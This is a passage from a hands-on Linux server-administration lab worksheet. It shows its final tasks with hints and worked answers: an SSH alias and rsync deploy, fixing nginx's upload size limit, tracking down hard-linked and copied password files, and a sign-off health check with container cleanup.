debug1: Server accepts key: /home/asha/.ssh/id_ed25519 ED25519 SHA256:HtZ++qb8bXP8BsHXfw/8086Qqnfjh+EZrCyHQMGRydU
Authenticated to localhost ([::1]:22) using "publickey".
```

The client only sees that its key was offered and the server moved on. The server's log says why: `~/.ssh` was `777`, another forum fix, so any user could have added their own key to it. sshd ignores keys it can't trust. `700` on the folder and `600` on `authorized_keys`, and the key works. When a key fails: `ssh -v` on the client, the log on the server.

</details>

### 27 · An SSH alias and an rsync deploy
Give `localhost` a short name, `web01`, in your SSH config file (user `asha`, Asha's key), and check what it expands to. Then deploy `~/site` to `/srv/releases/v2.15.0/` with rsync **over SSH**: dry run first, then the real run. Change `index.html`, delete `static/app.js`, and deploy again, so the server matches exactly. (Needs task 6: Asha writes to `/srv/releases` as a member of `devs`.)

<details>
<summary>Hint</summary>

A `Host web01` block with `HostName`, `User` and `IdentityFile` in `~/.ssh/config`, mode 600. `ssh -G web01` prints the final settings. `rsync -anv --delete ~/site/ web01:/srv/releases/v2.15.0/`: `-a` archive, `-n` dry run, `-v` list files, `--delete` removes what's gone locally. The slash after `site/` means "what's inside site".

</details>

<details>
<summary>Answer</summary>

```text
$ printf 'Host web01\n    HostName localhost\n    User asha\n    IdentityFile ~/.ssh/id_ed25519\n' > ~/.ssh/config
$ chmod 600 ~/.ssh/config
$ cat ~/.ssh/config
Host web01
    HostName localhost
    User asha
    IdentityFile ~/.ssh/id_ed25519
$ ssh web01 'echo $HOSTNAME'
web-01
$ ssh -G web01 2>/dev/null | grep -E '^(user|hostname|port|identityfile) '
user asha
hostname localhost
port 22
identityfile ~/.ssh/id_ed25519
$ find ~/site -type f
/home/asha/site/static/app.js
/home/asha/site/static/style.css
/home/asha/site/index.html
$ rsync -anv --delete ~/site/ web01:/srv/releases/v2.15.0/
sending incremental file list
created directory /srv/releases/v2.15.0
./
index.html
static/
static/app.js
static/style.css

sent 151 bytes  received 83 bytes  468.00 bytes/sec
total size is 85  speedup is 0.36 (DRY RUN)
$ rsync -av --delete ~/site/ web01:/srv/releases/v2.15.0/
sending incremental file list
created directory /srv/releases/v2.15.0
./
index.html
static/
static/app.js
static/style.css

sent 356 bytes  received 135 bytes  982.00 bytes/sec
total size is 85  speedup is 0.17
$ ls -la /srv/releases/v2.15.0
total 16
drwxr-xr-x 3 asha asha 4096 Oct 20 10:46 .
drwxrwsr-x 1 root devs 4096 Oct 20 10:59 ..
-rw-r--r-- 1 asha asha   29 Oct 20 10:46 index.html
drwxr-xr-x 2 asha asha 4096 Oct 20 10:46 static
$ echo '<h1>allcsvideos v2.15.0, checkout fix</h1>' > ~/site/index.html
$ rm ~/site/static/app.js
$ rsync -anv --delete ~/site/ web01:/srv/releases/v2.15.0/
sending incremental file list
index.html
deleting static/app.js
static/

sent 146 bytes  received 47 bytes  386.00 bytes/sec
total size is 72  speedup is 0.37 (DRY RUN)
$ rsync -av --delete ~/site/ web01:/srv/releases/v2.15.0/
sending incremental file list
index.html
deleting static/app.js
static/

sent 233 bytes  received 73 bytes  204.00 bytes/sec
total size is 72  speedup is 0.24
```

The alias works for every SSH tool, rsync included. Single quotes keep `$HOSTNAME` from expanding on your side. The second deploy sends only the one changed file and deletes the one removed file, exactly what the dry run promised. `-a` copies your files' modes, times, and group too (`asha`, not `devs`); on a team folder you'd add `--no-group` or fix the group after. Here, the "server" is the same machine; on a real one, only `HostName` changes.

</details>

---

## Final challenge

Three tasks that need everything above. Do them only after tasks 1 to 27.

### 28 · Meera's upload, end to end
Make a 6 megabyte test video at `/tmp/lesson-04.mp4` and upload it the way the site does: `POST` the raw bytes to `/api/upload?name=lesson-04.mp4` **through nginx**. It still fails, with a new error. Find which layer refuses it and why, fix it with a one-line `sed` that keeps a backup, check your change with `diff`, test, apply, and upload again. Prove the file landed on the data disk.

<details>
<summary>Hint</summary>

`head -c 6291456 /dev/urandom > /tmp/lesson-04.mp4`. `curl -s -X POST --data-binary @file 'localhost/api/upload?name=…'`. If the reply is an HTML page, it came from nginx, not the API: read the last line of `/var/log/nginx/error.log`. Search the enabled site with `grep -Rn` (capital R follows the symlink; `-r` skips it). `sed -i.bak` keeps the original as `.bak`.

</details>

<details>
<summary>Answer</summary>

```text
$ head -c 6291456 /dev/urandom > /tmp/lesson-04.mp4
$ ls -lh /tmp/lesson-04.mp4
-rw-r--r-- 1 asha asha 6.0M Oct 20 10:59 /tmp/lesson-04.mp4
$ curl -s -X POST --data-binary @/tmp/lesson-04.mp4 'localhost/api/upload?name=lesson-04.mp4' | grep title
<head><title>413 Request Entity Too Large</title></head>
$ tail -n 1 /var/log/nginx/error.log
2026/10/20 10:59:08 [error] 228#228: *12 client intended to send too large body: 6291456 bytes, client: 127.0.0.1, server: allcsvideos.com, request: "POST /api/upload?name=lesson-04.mp4 HTTP/1.1", host: "localhost"
$ grep -Rn client_max_body_size /etc/nginx/sites-enabled/
/etc/nginx/sites-enabled/allcsvideos:6:    client_max_body_size 1m;
$ sudo sed -i.bak 's/client_max_body_size 1m;/client_max_body_size 64m;/' /etc/nginx/sites-available/allcsvideos
$ diff /etc/nginx/sites-available/allcsvideos.bak /etc/nginx/sites-available/allcsvideos
6c6
<     client_max_body_size 1m;
---
>     client_max_body_size 64m;
$ sudo nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
$ sudo systemctl reload nginx
$ curl -s -X POST --data-binary @/tmp/lesson-04.mp4 'localhost/api/upload?name=lesson-04.mp4'
{"saved": "lesson-04.mp4", "bytes": 6291456}
$ ls -lh /data/uploads
total 15M
-rw-r--r-- 1 allcs allcs 3.0M Oct 20 10:57 lesson-01.mp4
-rw-r--r-- 1 allcs allcs 3.0M Oct 20 10:57 lesson-02.mp4
-rw-r--r-- 1 allcs allcs 3.0M Oct 20 10:57 lesson-03.mp4
-rw-r--r-- 1 allcs allcs 6.0M Oct 20 10:59 lesson-04.mp4
$ df -h /data
Filesystem      Size  Used Avail Use% Mounted on
tmpfs            64M   17M   48M  27% /data
```

The upload passed through three layers, and each one had broken in its own way tonight: nginx (`client_max_body_size 1m` refuses any body over one megabyte with a 413), the API (the unit typo, a 502), and the disk (full, a 507). Edit the real file in `sites-available`; the link in `sites-enabled` follows it. The `.bak` copy stays in `sites-available`, where nginx doesn't load it. Never leave a backup inside `sites-enabled`: nginx would load it too.

</details>

### 29 · Where else is the password? (Investigate)
Task 8 locked down `app.env`. But is that the only copy of the database password on the server? Search the usual folders for `DB_PASSWORD`. For each file you find, show its inode, link count, owner and mode, and test whether Priya can read it. Explain the difference between the copies, remove every extra one, and prove the API still works.

<details>
<summary>Hint</summary>

`sudo grep -rl DB_PASSWORD /srv /opt /home /var/backups /var/www /tmp /etc` lists matching files. `sudo ls -li` adds the inode number in front. Two names with the **same inode** are one file (a hard link); a different inode is a separate copy with its own permissions.

</details>

<details>
<summary>Answer</summary>

```text
$ sudo grep -rl DB_PASSWORD /srv /opt /home /var/backups /var/www /tmp /etc
/srv/allcsvideos/app.env
/home/priya/app.env.old
/var/backups/app.env.save
$ sudo ls -li /srv/allcsvideos/app.env /home/priya/app.env.old /var/backups/app.env.save
65732 -rw-r----- 2 root  allcs 115 Oct 20 10:46 /home/priya/app.env.old
65732 -rw-r----- 2 root  allcs 115 Oct 20 10:46 /srv/allcsvideos/app.env
43558 -rw-r--r-- 1 priya priya 115 Oct 20 10:57 /var/backups/app.env.save
$ sudo -u priya cat /home/priya/app.env.old
cat: /home/priya/app.env.old: Permission denied
$ sudo -u priya grep DB_PASSWORD /var/backups/app.env.save
DB_PASSWORD=demo-password-123
$ sudo rm /home/priya/app.env.old /var/backups/app.env.save
$ ls -li /srv/allcsvideos/app.env
65732 -rw-r----- 1 root allcs 115 Oct 20 10:46 /srv/allcsvideos/app.env
$ sudo grep -rl DB_PASSWORD /srv /opt /home /var/backups /var/www /tmp /etc
/srv/allcsvideos/app.env
$ curl -s localhost/api/health
{"status": "ok"}
```

`app.env.old` in Priya's home is a **hard link**: the same inode, 65732, as `app.env`. That was the link count of 2 in task 8. Permissions belong to the inode, so your `chmod 640` protected both names at once, and Priya is denied even in her own home folder. `app.env.save` is a separate **copy**, inode 43558, owned by priya with mode 644: anyone on the server could read the password. Removing the hard link only removed a name (the link count drops to 1, and the API's file is untouched). Removing the copy deleted the data. On a real server, the password has now been readable by others, so the last step is to **rotate** it: change it on the database and in `app.env`.

</details>

### 30 · Sign-off: prove web-01 is healthy
Before you reply to Rahul, prove every fix from this sheet in one short run of checks, without opening any file in an editor. Your checks must show: no failed units; nginx, the API, the encoder and SSH running; the API enabled at boot and the reindex job not; normal load; the data disk well below full with no deleted-but-open files; nothing world-writable under `/var/www`; clean sudoers and sshd configs; a key login through your SSH alias; the storefront, robots.txt and the API through nginx; Priya's sudo rule; and Priya in `devs`.

<details>
<summary>Hint</summary>

Every check is one command you already used: `systemctl --failed`, `systemctl is-active` and `is-enabled` (several units at once), `uptime`, `df -h`, `lsof +L1`, `find … -perm -o+w ! -type l`, `visudo -c`, `sshd -t`, `ssh web01`, `curl`, `sudo -u priya sudo -n nginx -t`, `id priya`. Silence is good news for `lsof`, `find`, and `visudo -c | grep -v 'parsed OK'`.

</details>

<details>
<summary>Answer</summary>

```text
$ systemctl --failed
  UNIT LOAD ACTIVE SUB DESCRIPTION

0 loaded units listed.
$ systemctl is-active nginx allcsvideos-api allcsvideos-encoder ssh
active
active
active
active
$ systemctl is-enabled allcsvideos-api allcsvideos-reindex
enabled
disabled
$ uptime
 10:59:09 up  2:06,  0 user,  load average: 0.51, 0.60, 0.62
$ df -h /data
Filesystem      Size  Used Avail Use% Mounted on
tmpfs            64M   17M   48M  27% /data
$ sudo lsof +L1
$ sudo find /var/www -perm -o+w ! -type l
$ sudo visudo -c | grep -v 'parsed OK'
$ sudo sshd -t && echo sshd config OK
sshd config OK
$ ssh web01 hostname
web-01
$ curl -s localhost | grep -o '<title>.*</title>'
<title>allcsvideos - learn computer science by video</title>
$ curl -s localhost/robots.txt | head -n 1
User-agent: *
$ curl -s localhost/api/health
{"status": "ok"}
$ sudo -u priya sudo -n nginx -t 2>&1 | tail -n 1
nginx: configuration file /etc/nginx/nginx.conf test is successful
$ id priya
uid=1002(priya) gid=1002(priya) groups=1002(priya),1003(devs)
```

Every line is a fact you can paste into the incident report. Notice that this is a list of commands you'd run after every change: in Module 3 you'll turn exactly this into a health-check script. And a good reply to Rahul has the four parts from Module 2, lesson 4: **when** (02:47 the disk filled, 02:58 the API broke), **where** (uploads, then every API path), **who** (Meera, then every student), and **why** (a deleted log still held open, a typo in a unit file, an upload limit of one megabyte), plus what you hardened on the way: the uploads folder, the secrets, sudo and SSH.

</details>

---

## Clean up

When you're done, remove everything this lab created. Pulled base images, like `ubuntu:24.04`, can stay.

```bash
docker rm -f m02lab-web01
docker rmi m02lab-web01
```

These should all print nothing:

```bash
docker ps -a --filter name=m02lab
docker images --filter reference='m02lab*' -q
```

**Score yourself:** 25 to 30 tasks solved on your own means you're ready for Module 03. Under 18, rewatch the lesson named above the tasks you missed. Tasks 7, 17, 21 and 29 are the ones real incidents are made of: they're the difference between "it works again" and "I know what happened, and it can't happen the same way twice".
